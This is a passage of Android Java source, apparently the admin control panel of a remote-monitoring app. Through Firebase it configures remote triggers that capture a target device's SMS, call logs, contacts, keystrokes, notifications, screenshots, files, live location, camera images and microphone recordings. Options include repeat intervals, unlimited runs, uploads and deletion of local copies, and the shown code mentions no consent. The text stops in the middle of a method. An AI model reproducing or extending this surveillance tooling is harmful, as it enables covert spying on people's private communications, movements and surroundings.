package com.vikasyadavnsit.cdc.fragment;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.GridLayout;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.slider.Slider;
import com.google.android.material.switchmaterial.SwitchMaterial;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActionCategory;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.enums.TriggerType;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

public class RemoteTriggerClickActionsFragment extends Fragment {

    private static WeakReference<RemoteTriggerClickActionsFragment> activeInstance;
    private static Map<String, User.AppTriggerSettingsData> lastDataMap;
    private LinearLayout containerLayout;

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        activeInstance = new WeakReference<>(this);
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater,
                             @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_remote_triggers, container, false);
        this.containerLayout = view.findViewById(R.id.remote_triggers_container);
        
        if (lastDataMap != null) {
            updateUI(lastDataMap);
        }
        
        FirebaseUtils.getAndroidUserClickActions();
        return view;
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        FirebaseUtils.stopMonitoringClickActions();
        containerLayout = null;
    }

    public static void addDynamicButtons(Activity activity,
                                         Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap) {
        if (Objects.equals(lastDataMap, appTriggerSettingsDataMap)) {
            return;
        }
        lastDataMap = appTriggerSettingsDataMap;
        RemoteTriggerClickActionsFragment fragment = activeInstance != null ? activeInstance.get() : null;
        if (fragment != null && activity != null) {
            activity.runOnUiThread(() -> fragment.updateUI(appTriggerSettingsDataMap));
        }
    }

    private void updateUI(Map<String, User.AppTriggerSettingsData> dataMap) {
        if (containerLayout == null || getContext() == null) return;
        
        containerLayout.removeAllViews();
        if (dataMap == null || dataMap.isEmpty()) {
            showEmptyState();
            return;
        }

        Activity activity = getActivity();
        if (activity == null) return;
        float density = getResources().getDisplayMetrics().density;

        Map<ClickActionCategory, List<Map.Entry<String, User.AppTriggerSettingsData>>> groupedActions = 
            dataMap.entrySet().stream()
                .filter(entry -> {
                    try {
                        String key = entry.getKey();
                        ClickActions action = ClickActions.valueOf(key);
                        return action != ClickActions.CAPTURE_ALL_SMS && 
                            action != ClickActions.CAPTURE_ALL_CALL_LOGS && 
                            action != ClickActions.CAPTURE_ALL_CONTACTS &&
                            action != ClickActions.TRACK_LIVE_LOCATION &&
                            action != ClickActions.TRIGGER_CAMERA_CAPTURE &&
                            action != ClickActions.TOGGLE_LIVE_CAMERA_FEED &&
                            action != ClickActions.TRIGGER_MIC_RECORDING &&
                            action != ClickActions.GET_DIRECTORY_STRUCTURE &&
                            action != ClickActions.GET_APP_USAGE_STATISTICS_REPORT &&
                            action != ClickActions.CAPTURE_INSTALLED_APPS &&
                            action != ClickActions.MONITOR_SCREEN_STATE &&
                            action != ClickActions.MONITOR_CALL_STATE &&
                            action != ClickActions.CAPTURE_NOTIFICATIONS &&
                            action != ClickActions.REQUEST_POST_NOTIFICATION_PERMISSION;
                    } catch (IllegalArgumentException e) {
                        return false;
                    }
                })
                .collect(Collectors.groupingBy(entry -> ClickActions.valueOf(entry.getKey()).getCategory()));

        List<ClickActionCategory> sortedCategories = Arrays.asList(ClickActionCategory.values());

        for (ClickActionCategory category : sortedCategories) {
            List<Map.Entry<String, User.AppTriggerSettingsData>> actions = groupedActions.get(category);
            if (actions == null || actions.isEmpty()) continue;

            LinearLayout groupContainer = new LinearLayout(activity);
            groupContainer.setOrientation(LinearLayout.VERTICAL);
            LinearLayout.LayoutParams groupParams = new LinearLayout.LayoutParams(-1, -2);
            int sideMargin = dp(12, density);
            groupParams.setMargins(sideMargin, dp(16, density), sideMargin, dp(16, density));
            groupContainer.setLayoutParams(groupParams);
            groupContainer.setBackgroundResource(R.drawable.bg_category_group);
            groupContainer.setPadding(0, 0, 0, dp(24, density));

            groupContainer.addView(createCategoryHeader(activity, category, density));

            GridLayout grid = createCategoryGrid(activity, density);
            actions.sort(Comparator.comparingInt(e -> {
                try { return ClickActions.valueOf(e.getKey()).getOrder(); }
                catch (Exception ex) { return 999; }
            }));

            for (Map.Entry<String, User.AppTriggerSettingsData> actionEntry : actions) {
                grid.addView(buildActionCard(activity, actionEntry.getKey(), actionEntry.getValue()));
            }
            groupContainer.addView(grid);
            containerLayout.addView(groupContainer);
        }
    }

    private void showEmptyState() {
        if (containerLayout == null || getContext() == null) return;
        float density = getResources().getDisplayMetrics().density;
        TextView msg = new TextView(getContext());
        msg.setText("No trigger data available for this user.");
        msg.setTextColor(requireContext().getColor(R.color.text_hint));
        msg.setTextSize(13f);
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, dp(48, density), 0, 0);
        containerLayout.addView(msg);
    }

    private View createCategoryHeader(Activity activity, ClickActionCategory category, float density) {
        LinearLayout header = new LinearLayout(activity);
        header.setOrientation(LinearLayout.VERTICAL);
        header.setPadding(dp(24, density), dp(24, density), dp(24, density), dp(12, density));

        LinearLayout titleRow = new LinearLayout(activity);
        titleRow.setOrientation(LinearLayout.HORIZONTAL);
        titleRow.setGravity(Gravity.CENTER_VERTICAL);

        View accent = new View(activity);
        GradientDrawable accentDrawable = new GradientDrawable();
        accentDrawable.setColor(activity.getColor(R.color.primary));
        accentDrawable.setCornerRadius(dp(4, density));
        accent.setBackground(accentDrawable);
        LinearLayout.LayoutParams accentParams = new LinearLayout.LayoutParams(dp(4, density), dp(20, density));
        accentParams.setMarginEnd(dp(12, density));
        accent.setLayoutParams(accentParams);
        titleRow.addView(accent);

        TextView label = new TextView(activity);
        label.setText(category.getLabel());
        label.setTextColor(activity.getColor(R.color.on_primary));
        label.setTextSize(18f);
        label.setLetterSpacing(0.04f);
        label.setTypeface(Typeface.create("sans-serif-black", Typeface.NORMAL));
        label.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1f));
        titleRow.addView(label);

        com.google.android.material.switchmaterial.SwitchMaterial toggle = new com.google.android.material.switchmaterial.SwitchMaterial(activity);
        toggle.setChecked(com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.isCategoryEnabled(activity, category.name()));
        toggle.setOnCheckedChangeListener((buttonView, isChecked) -> {
            com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.setCategoryEnabled(activity, category.name(), isChecked);
            android.widget.Toast.makeText(activity, category.getLabel() + (isChecked ? " Viewer Enabled" : " Viewer Disabled"), android.widget.Toast.LENGTH_SHORT).show();
        });
        titleRow.addView(toggle);
        
        header.addView(titleRow);

        TextView desc = new TextView(activity);
        desc.setText(category.getDescription());
        desc.setTextColor(activity.getColor(R.color.text_secondary));
        desc.setTextSize(11f);
        desc.setAlpha(0.6f);
        desc.setPadding(dp(16, density), dp(4, density), 0, 0);
        header.addView(desc);

        return header;
    }

    private GridLayout createCategoryGrid(Activity activity, float density) {
        GridLayout grid = new GridLayout(activity);
        grid.setPadding(dp(8, density), 0, dp(8, density), 0);
        
        DisplayMetrics dm = activity.getResources().getDisplayMetrics();
        float dpWidth = dm.widthPixels / dm.density;
        int cols = dpWidth < 600 ? 1 : (dpWidth < 900 ? 2 : 3); // Better for one-column on mobile

        grid.setColumnCount(cols);
        grid.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        return grid;
    }

    private View buildActionCard(Activity activity, String key, User.AppTriggerSettingsData data) {
        boolean enabled = data.isEnabled();
        View cardView = LayoutInflater.from(activity).inflate(R.layout.item_remote_trigger_card, null);
        cardView.setLayoutParams(createLayoutParams(activity.getResources().getDisplayMetrics().density));

        TextView iconView = cardView.findViewById(R.id.trigger_icon);
        TextView titleView = cardView.findViewById(R.id.trigger_title);
        TextView descView = cardView.findViewById(R.id.trigger_description);
        
        android.widget.ImageView permIcon = cardView.findViewById(R.id.perm_status_icon);
        TextView permText = cardView.findViewById(R.id.permission_status_text);
        
        TextView activeStatusText = cardView.findViewById(R.id.active_status_text);
        View statusDot = cardView.findViewById(R.id.status_dot);
        
        TextView metricDelay = cardView.findViewById(R.id.metric_delay);
        TextView metricRuns = cardView.findViewById(R.id.metric_runs);
        
        Button exploreBtn = cardView.findViewById(R.id.btn_explore);
        Button resetBtn = cardView.findViewById(R.id.btn_reset);
        Button configBtn = cardView.findViewById(R.id.btn_configure);

        ClickActions actionInfoTemp = null;
        try { actionInfoTemp = ClickActions.valueOf(key); } catch (Exception ignored) {}
        final ClickActions actionInfo = actionInfoTemp;

        iconView.setText(getIconForKey(key));
        titleView.setText(actionInfo != null ? actionInfo.getActionLabel() : key.replace("_", " "));
        descView.setText(actionInfo != null ? actionInfo.getDescription() : "No description available.");
        
        // Intuitive Permission Status
        boolean granted = data.isPermissionGranted();
        if (granted) {
            permText.setText("System Access Granted");
            permText.setTextColor(activity.getColor(R.color.spending_credit));
            permIcon.setImageResource(android.R.drawable.presence_online); // Simple circle-check-like icon
            permIcon.setColorFilter(activity.getColor(R.color.spending_credit));
        } else {
            permText.setText("Setup Required (Permission Missing)");
            permText.setTextColor(activity.getColor(R.color.spending_debit));
            permIcon.setImageResource(android.R.drawable.stat_notify_error);
            permIcon.setColorFilter(activity.getColor(R.color.spending_debit));
        }

        // Intuitive Trigger Status
        activeStatusText.setText(enabled ? "REMOTE TRIGGER: ON" : "REMOTE TRIGGER: OFF");
        activeStatusText.setTextColor(enabled ? activity.getColor(R.color.primary) : activity.getColor(R.color.text_hint));
        statusDot.setBackgroundResource(enabled ? R.drawable.bg_status_active : R.drawable.bg_status_inactive);

        metricDelay.setText("🕒 Delay: " + formatInterval(data.getInterval()));
        metricRuns.setText("🎯 Limit: " + (data.getMaxRepetitions() > 0 ? data.getMaxRepetitions() + " runs" : "Unlimited"));

        boolean isCapturePermission = actionInfo != null && actionInfo.getTriggerType() == com.vikasyadavnsit.cdc.enums.TriggerType.PERMISSION;

        // Clean UI for Permissions
        if (actionInfo != null && actionInfo.getTriggerType() == com.vikasyadavnsit.cdc.enums.TriggerType.PERMISSION) {
            metricDelay.setVisibility(View.GONE);
            metricRuns.setVisibility(View.GONE);
            activeStatusText.setVisibility(View.GONE);
            statusDot.setVisibility(View.GONE);
            
            // Allow clicking even if granted to manage capture settings for specific permissions
            configBtn.setText(granted ? (isCapturePermission ? "Configure" : "Granted") : "Request");
            if (granted && !isCapturePermission) {
                configBtn.setAlpha(0.5f);
                configBtn.setEnabled(false);
            } else {
                configBtn.setAlpha(1.0f);
                configBtn.setEnabled(true);
            }
        }

        // Show Reset button for ALL actions as requested to allow global disabling
        resetBtn.setVisibility(View.VISIBLE);
        resetBtn.setOnClickListener(v -> {
            new com.google.android.material.dialog.MaterialAlertDialogBuilder(requireContext(), R.style.ThemeOverlay_CDC_MaterialAlertDialog)
                    .setTitle("Full Reset & Disable")
                    .setMessage("This will disable " + titleView.getText() + " globally. The client will ignore this action and background tasks until you re-enable it manually.")
                    .setPositiveButton("Reset & Disable", (d, w) -> {
                        User.AppTriggerSettingsData resetData = User.AppTriggerSettingsData.builder()
                                .type(actionInfo != null ? actionInfo.getTriggerType() : com.vikasyadavnsit.cdc.enums.TriggerType.SYSTEM)
                                .enabled(false) // Disable globally as requested
                                .captureEnabled(false)
                                .captureMode("REAL_TIME")
                                .captureScheduleTime("20:00")
                                .interval(key.equals(ClickActions.REQUEST_LOCATION_PERMISSION.name()) ? 60000 : 
                                         (key.equals(ClickActions.REQUEST_CAMERA_PERMISSION.name()) ? 1000 : 
                                         (key.equals(ClickActions.REQUEST_MIC_PERMISSION.name()) ? 30000 : 0)))
                                .actionStatus(ActionStatus.IDLE)
                                .permissionGranted(data.isPermissionGranted())
                                .clickActions(ClickActions.valueOf(key))
                                .uploadDataSnapshot(true)
                                .saveOnLocalFile(true)
                                .build();
                        
                        // Specialized defaults for Usage
                        if (key.equals(ClickActions.MANAGE_USAGE_AND_APPS.name())) {
                            resetData.setCaptureEnabled(true);
                        }
                        
                        FirebaseUtils.updateRemoteTrigger(key, resetData);
                        Toast.makeText(getContext(), "Action reset and disabled", Toast.LENGTH_SHORT).show();
                        FirebaseUtils.getAndroidUserClickActions(); // Force refresh Admin UI
                    })
                    .setNegativeButton("Cancel", null)
                    .show();
        });

        exploreBtn.setOnClickListener(v -> {
            androidx.fragment.app.FragmentManager fm = ((androidx.fragment.app.FragmentActivity) activity).getSupportFragmentManager();
            switch (key) {
                case "REQUEST_SMS_PERMISSION":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new AdminSmsFragment());
                    break;
                case "REQUEST_CALL_LOG_PERMISSION":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new AdminCallLogsFragment());
                    break;
                case "REQUEST_CONTACTS_PERMISSION":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new AdminContactsFragment());
                    break;
                case "REQUEST_FILE_ACCESS_PERMISSION":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new AdminFileStructureFragment());
                    break;
                case "MANAGE_USAGE_AND_APPS":
                case "GET_APP_USAGE_STATISTICS_REPORT":
                case "CAPTURE_INSTALLED_APPS":
                case "MONITOR_SCREEN_STATE":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new UsageViewerFragment());
                    break;
                case "REQUEST_LOCATION_PERMISSION":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new LiveLocationFragment());
                    break;
                case "START_SENSOR_SERVICE":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new AdminSensorsFragment());
                    break;
                case "CAPTURE_KEY_STROKES":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new KeyStrokesFragment());
                    break;
                case "CAPTURE_NOTIFICATIONS":
                case "REQUEST_NOTIFICATION_ACCESS":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new AdminNotificationContainerFragment());
                    break;
                case "REQUEST_SCREENSHOT_PERMISSION":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new AdminScreenshotFragment());
                    break;
                case "REQUEST_CAMERA_PERMISSION":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new AdminCameraFragment());
                    break;
                case "REQUEST_MIC_PERMISSION":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new AdminMicFragment());
                    break;
                case "REQUEST_VPN_PERMISSION":
                    com.vikasyadavnsit.cdc.utils.CommonUtil.loadFragmentWithBackStack(fm, new AdminVpnFragment());
                    break;
                default:
                    Toast.makeText(activity, "No viewer for " + key, Toast.LENGTH_SHORT).show();
            }
        });

        configBtn.setOnClickListener(v -> showConfigDialog(activity, key, data));

        return cardView;
    }

    private void showConfigDialog(Activity activity, String key, User.AppTriggerSettingsData data) {
        View dialogView = LayoutInflater.from(activity).inflate(R.layout.dialog_remote_trigger_config, null);
        AlertDialog dialog = new AlertDialog.Builder(activity).setView(dialogView).create();

        if (dialog.getWindow() != null) {
            dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        }

        TextView title = dialogView.findViewById(R.id.dialog_title);
        TextView permStatus = dialogView.findViewById(R.id.dialog_permission_status);
        SwitchMaterial switchEnabled = dialogView.findViewById(R.id.switch_enabled);
        SwitchMaterial switchRepeatable = dialogView.findViewById(R.id.switch_repeatable);
        
        View layoutCaptureOptions = dialogView.findViewById(R.id.layout_capture_options);
        CheckBox checkUpload = dialogView.findViewById(R.id.check_upload_snapshot);
        CheckBox checkSaveLocal = dialogView.findViewById(R.id.check_save_local);
        CheckBox checkDeleteLocal = dialogView.findViewById(R.id.check_delete_local);

        View layoutInterval = dialogView.findViewById(R.id.layout_interval);
        View layoutMaxReps = dialogView.findViewById(R.id.layout_max_reps);
        View layoutStatus = dialogView.findViewById(R.id.layout_status_container);

        EditText editInterval = dialogView.findViewById(R.id.edit_interval);
        EditText editMaxReps = dialogView.findViewById(R.id.edit_max_reps);
        View layoutLogLevels = dialogView.findViewById(R.id.layout_log_levels);
        EditText editLogLevels = dialogView.findViewById(R.id.edit_log_levels);
        Spinner spinnerStatus = dialogView.findViewById(R.id.spinner_status);
        Button btnSave = dialogView.findViewById(R.id.btn_save);

        title.setText(formatLabel(key));

        ClickActions actionInfoTemp = null;
        try { actionInfoTemp = ClickActions.valueOf(key); } catch (Exception ignored) {}
        final ClickActions actionInfo = actionInfoTemp;

        boolean granted = data.isPermissionGranted();
        boolean isCapturePermission = key.equals(ClickActions.REQUEST_SMS_PERMISSION.name()) || 
                                     key.equals(ClickActions.REQUEST_CALL_LOG_PERMISSION.name()) || 
                                     key.equals(ClickActions.REQUEST_CONTACTS_PERMISSION.name()) ||
                                     key.equals(ClickActions.REQUEST_LOCATION_PERMISSION.name()) ||
                                     key.equals(ClickActions.REQUEST_CAMERA_PERMISSION.name()) ||
                                     key.equals(ClickActions.REQUEST_MIC_PERMISSION.name()) ||
                                     key.equals(ClickActions.REQUEST_VPN_PERMISSION.name()) ||
                                     key.equals(ClickActions.REQUEST_SCREENSHOT_PERMISSION.name()) ||
                                     key.equals(ClickActions.REQUEST_FILE_ACCESS_PERMISSION.name()) ||
                                     key.equals(ClickActions.MANAGE_USAGE_AND_APPS.name()) ||
                                     key.equals(ClickActions.REQUEST_NOTIFICATION_ACCESS.name());

        if (actionInfo != null) {
            com.vikasyadavnsit.cdc.enums.TriggerType type = actionInfo.getTriggerType();
            
            if (type == com.vikasyadavnsit.cdc.enums.TriggerType.PERMISSION) {
                switchEnabled.setVisibility(View.GONE);
                switchRepeatable.setVisibility(View.GONE);
                layoutInterval.setVisibility(View.GONE);
                layoutMaxReps.setVisibility(View.GONE);
                layoutStatus.setVisibility(View.GONE);
                
                btnSave.setText(granted ? "Save Configuration" : "Request System Access");
            } else if (type == com.vikasyadavnsit.cdc.enums.TriggerType.DATA_CAPTURE) {
                layoutCaptureOptions.setVisibility(View.VISIBLE);
                checkUpload.setChecked(data.isUploadDataSnapshot());
                checkSaveLocal.setChecked(data.isSaveOnLocalFile());
                checkDeleteLocal.setChecked(data.isDeleteLocalData());
            }
        }
        
        if (ClickActions.PUSH_REMOTE_LOGS.name().equals(key)) {
            layoutLogLevels.setVisibility(View.VISIBLE);
            editLogLevels.setText(data.getLogLevels() != null ? data.getLogLevels() : "DEBUG,INFO,WARN,ERROR");
            editLogLevels.setOnClickListener(v -> {
                String[] levels = {"DEBUG", "INFO", "WARN", "ERROR"};
                boolean[] checked = new boolean[levels.length];
                String current = editLogLevels.getText().toString();
                for (int i = 0; i < levels.length; i++) {
                    checked[i] = current.contains(levels[i]);
                }

                new com.google.android.material.dialog.MaterialAlertDialogBuilder(activity, R.style.ThemeOverlay_CDC_MaterialAlertDialog)
                        .setTitle("Select Log Levels to Upload")
                        .setMultiChoiceItems(levels, checked, (d, which, isChecked) -> {
                            checked[which] = isChecked;
                        })
                        .setPositiveButton("OK", (d, which) -> {
                            StringBuilder sb = new StringBuilder();
                            for (int i = 0; i < levels.length; i++) {
                                if (checked[i]) {
                                    if (sb.length() > 0) sb.append(",");
                                    sb.append(levels[i]);
                                }
                            }
                            editLogLevels.setText(sb.toString());
                        })
                        .setNegativeButton("Cancel", null)
                        .show();
            });
        }
        
        if (granted) {
            permStatus.setText("✓ Ready: System Access Granted");
            permStatus.setTextColor(activity.getColor(R.color.spending_credit));
        } else {
            permStatus.setText("⚠ Action Required: Permission Missing");
            permStatus.setTextColor(activity.getColor(R.color.spending_debit));
        }

        switchEnabled.setChecked(data.isEnabled());
        switchRepeatable.setChecked(data.isRepeatable());
        editInterval.setText(String.valueOf(data.getInterval()));
        editMaxReps.setText(String.valueOf(data.getMaxRepetitions()));

        ArrayAdapter<ActionStatus> adapter = new ArrayAdapter<ActionStatus>(activity, android.R.layout.simple_spinner_item, ActionStatus.values()) {
            @NonNull
            @Override
            public View getView(int pos, @Nullable View cv, @NonNull ViewGroup parent) {
                View v = super.getView(pos, cv, parent);
                if (v instanceof TextView) {
                    ((TextView) v).setTextColor(activity.getColor(R.color.text_primary));
                    ((TextView) v).setTextSize(14f);
                }
                return v;
            }
            @Override
            public View getDropDownView(int pos, @Nullable View cv, @NonNull ViewGroup parent) {
                View v = super.getDropDownView(pos, cv, parent);
                v.setBackgroundColor(activity.getColor(R.color.surface_variant));
                if (v instanceof TextView) {
                    ((TextView) v).setTextColor(activity.getColor(R.color.text_primary));
                    ((TextView) v).setPadding(dp(16, activity.getResources().getDisplayMetrics().density), 
                                            dp(12, activity.getResources().getDisplayMetrics().density), 
                                            dp(16, activity.getResources().getDisplayMetrics().density), 
                                            dp(12, activity.getResources().getDisplayMetrics().density));
                }
                return v;
            }
        };
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinnerStatus.setAdapter(adapter);
        spinnerStatus.setSelection(data.getActionStatus() != null ? data.getActionStatus().ordinal() : 0);

        btnSave.setOnClickListener(v -> {
            try {
                ClickActions finalAction = null;
                try { finalAction = ClickActions.valueOf(key); } catch (Exception ignored) {}

                User.AppTriggerSettingsData.AppTriggerSettingsDataBuilder builder = User.AppTriggerSettingsData.builder()
                        .type(finalAction != null ? finalAction.getTriggerType() : null)
                        .enabled(switchEnabled.isChecked() || (finalAction != null && finalAction.getTriggerType() == com.vikasyadavnsit.cdc.enums.TriggerType.PERMISSION))
                        .permissionGranted(data.isPermissionGranted()) // Preserve existing permission status
                        .captureEnabled(data.isCaptureEnabled())
                        .captureMode(data.getCaptureMode())
                        .captureScheduleTime(data.getCaptureScheduleTime())
                        .lastCaptureTimestamp(System.currentTimeMillis()) // Force update trigger
                        .repeatable(switchRepeatable.isChecked())
                        .interval(Long.parseLong(editInterval.getText().toString()))
                        .maxRepetitions(Integer.parseInt(editMaxReps.getText().toString()))
                        .actionStatus(finalAction != null && finalAction.getTriggerType() == com.vikasyadavnsit.cdc.enums.TriggerType.PERMISSION ? 
                                (data.getActionStatus() == ActionStatus.START ? ActionStatus.IDLE : ActionStatus.PREPARE) : (ActionStatus) spinnerStatus.getSelectedItem())
                        .clickActions(data.getClickActions())
                        .uploadDataSnapshot(checkUpload.isChecked())
                        .deleteLocalData(checkDeleteLocal.isChecked())
                        .saveOnLocalFile(checkSaveLocal.isChecked())
                        .logLevels(ClickActions.PUSH_REMOTE_LOGS.name().equals(key) ? editLogLevels.getText().toString() : data.getLogLevels())
                        .extraConfig(data.getExtraConfig());

                // If capture options were added, retrieve their values from the dynamically added views
                View captureContainer = dialogView.findViewWithTag("capture_settings_container");
                if (captureContainer != null) {
                    SwitchMaterial switchCapture = captureContainer.findViewWithTag("switch_capture_enabled");
                    SwitchMaterial switchLive = captureContainer.findViewWithTag("switch_live_enabled");
                    SwitchMaterial switchPersist = captureContainer.findViewWithTag("switch_persist_location");
                    Spinner spinnerInterval = captureContainer.findViewWithTag("spinner_location_interval");
                    RadioGroup groupMode = captureContainer.findViewWithTag("radio_group_capture_mode");
                    TextView textTime = captureContainer.findViewWithTag("text_capture_time");
                    
                    if (switchCapture != null) {
                        builder.captureEnabled(switchCapture.isChecked());
                    }

                    if (switchLive != null || switchPersist != null || spinnerInterval != null) {
                        java.util.Map<String, Object> extra = data.getExtraConfig();
                        java.util.Map<String, Object> newExtra = extra != null ? new java.util.HashMap<>(extra) : new java.util.HashMap<>();
                        if (switchLive != null) newExtra.put("liveMonitoringEnabled", switchLive.isChecked());
                        if (switchPersist != null) newExtra.put("persistLocationHistory", switchPersist.isChecked());
                        if (spinnerInterval != null) {
                            String selected = spinnerInterval.getSelectedItem().toString();
                            long intervalMs = 60000;
                            if (selected.contains("15 second")) intervalMs = 15000;
                            else if (selected.contains("30 second")) intervalMs = 30000;
                            else if (selected.contains("1 minute")) intervalMs = 60000;
                            else if (selected.contains("5 minutes")) intervalMs = 300000;
                            else if (selected.contains("30 minutes")) intervalMs = 1800000;
                            builder.interval(intervalMs);
                        }
                        builder.extraConfig(newExtra);
                    }

                    // --- Camera & Screenshot Specific Saving ---
                    if (key.equals(ClickActions.REQUEST_CAMERA_PERMISSION.name()) || 
                        key.equals(ClickActions.REQUEST_SCREENSHOT_PERMISSION.name())) {
                        java.util.Map<String, Object> extra = data.getExtraConfig();
                        java.util.Map<String, Object> newExtra = extra != null ? new java.util.HashMap<>(extra) : new java.util.HashMap<>();
                        
                        if (key.equals(ClickActions.REQUEST_CAMERA_PERMISSION.name())) {
                            Spinner camSpinner = captureContainer.findViewWithTag("spinner_camera_facing");
                            if (camSpinner != null) {
                                int pos = camSpinner.getSelectedItemPosition();
                                if (pos == 1) newExtra.put("cameraFacing", "FRONT");
                                else if (pos == 2) newExtra.put("cameraFacing", "BOTH");
                                else newExtra.put("cameraFacing", "BACK");
                            }
                        }

                        Spinner resSpinner = captureContainer.findViewWithTag("spinner_camera_resolution");
                        if (resSpinner != null) {
                            String sel = resSpinner.getSelectedItem().toString();
                            if (sel.contains("480p")) newExtra.put("resolution", "480p");
                            else if (sel.contains("720p")) newExtra.put("resolution", "720p");
                            else if (sel.contains("1080p")) newExtra.put("resolution", "1080p");
                        }

                        com.google.android.material.slider.Slider qualSlider = captureContainer.findViewWithTag("slider_camera_quality");
                        if (qualSlider != null) {
                            newExtra.put("quality", (int) qualSlider.getValue());
                        }

                        if (key.equals(ClickActions.REQUEST_CAMERA_PERMISSION.name())) {
                            Spinner intervalSpinner = captureContainer.findViewWithTag("spinner_camera_interval");
                            if (intervalSpinner != null) {
                                String selected = intervalSpinner.getSelectedItem().toString();
                                long intervalMs = 1000;
                                if (selected.contains("200 ms")) intervalMs = 200;
                                else if (selected.contains("500 ms")) intervalMs = 500;
                                else if (selected.contains("1 sec")) intervalMs = 1000;
                                else if (selected.contains("3 sec")) intervalMs = 3000;
                                else if (selected.contains("5 sec")) intervalMs = 5000;
                                builder.interval(intervalMs);
                            }

                            Spinner durationSpinner = captureContainer.findViewWithTag("spinner_camera_duration");
                            if (durationSpinner != null) {
                                String selected = durationSpinner.getSelectedItem().toString();
                                int durationSec = 15;
                                if (selected.contains("15 sec")) durationSec = 15;
                                else if (selected.contains("30 sec")) durationSec = 30;
                                else if (selected.contains("1 min")) durationSec = 60;
                                newExtra.put("duration", durationSec);
                            }
                        }

                        builder.extraConfig(newExtra);
                    }

                    // --- Mic Specific Saving ---
                    if (key.equals(ClickActions.REQUEST_MIC_PERMISSION.name())) {
                        Spinner micSpinner = captureContainer.findViewWithTag("spinner_mic_duration");
                        SwitchMaterial switchPersistMic = captureContainer.findViewWithTag("switch_persist_mic");
                        
                        java.util.Map<String, Object> extra = data.getExtraConfig();
                        java.util.Map<String, Object> micExtra = extra != null ? new java.util.HashMap<>(extra) : new java.util.HashMap<>();

                        if (micSpinner != null) {
                            String selected = micSpinner.getSelectedItem().toString();
                            long durationMs = 30000;
                            if (selected.contains("15 seconds")) durationMs = 15000;
                            else if (selected.contains("30 seconds")) durationMs = 30000;
                            else if (selected.contains("1 minute")) durationMs = 60000;
                            else if (selected.contains("2 minutes")) durationMs = 120000;
                            else if (selected.contains("5 minutes")) durationMs = 300000;
                            builder.interval(durationMs);
                        }
                        
                        if (switchPersistMic != null) {
                            micExtra.put("persistMicRecordings", switchPersistMic.isChecked());
                        }
                        builder.extraConfig(micExtra);
                    }
                    
                    if (groupMode != null && groupMode.getVisibility() == View.VISIBLE) {
                        int checkedId = groupMode.getCheckedRadioButtonId();
                        View selected = groupMode.findViewById(checkedId);
                        if (selected != null && selected.getTag() != null) {
                            builder.captureMode(selected.getTag().toString());
                        }
                    }
                    
                    if (textTime != null) builder.captureScheduleTime(textTime.getText().toString());
                }

                User.AppTriggerSettingsData updated = builder.build();
                
                FirebaseUtils.updateRemoteTrigger(key, updated);
                Toast.makeText(activity, "Synced", Toast.LENGTH_SHORT).show();
                dialog.dismiss();
                FirebaseUtils.getAndroidUserClickActions();
            } catch (Exception e) {
                Toast.makeText(activity, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });
        
        if (granted && isCapturePermission) {
            addCaptureSettingsToDialog(activity, dialogView, data, key);
        }
        
        dialog.show();
    }

    private void addCaptureSettingsToDialog(Activity activity, View dialogView, User.AppTriggerSettingsData data, String key) {
        float density = activity.getResources().getDisplayMetrics().density;
        boolean isLocation = key.equals(ClickActions.REQUEST_LOCATION_PERMISSION.name());
        boolean isCamera = key.equals(ClickActions.REQUEST_CAMERA_PERMISSION.name());
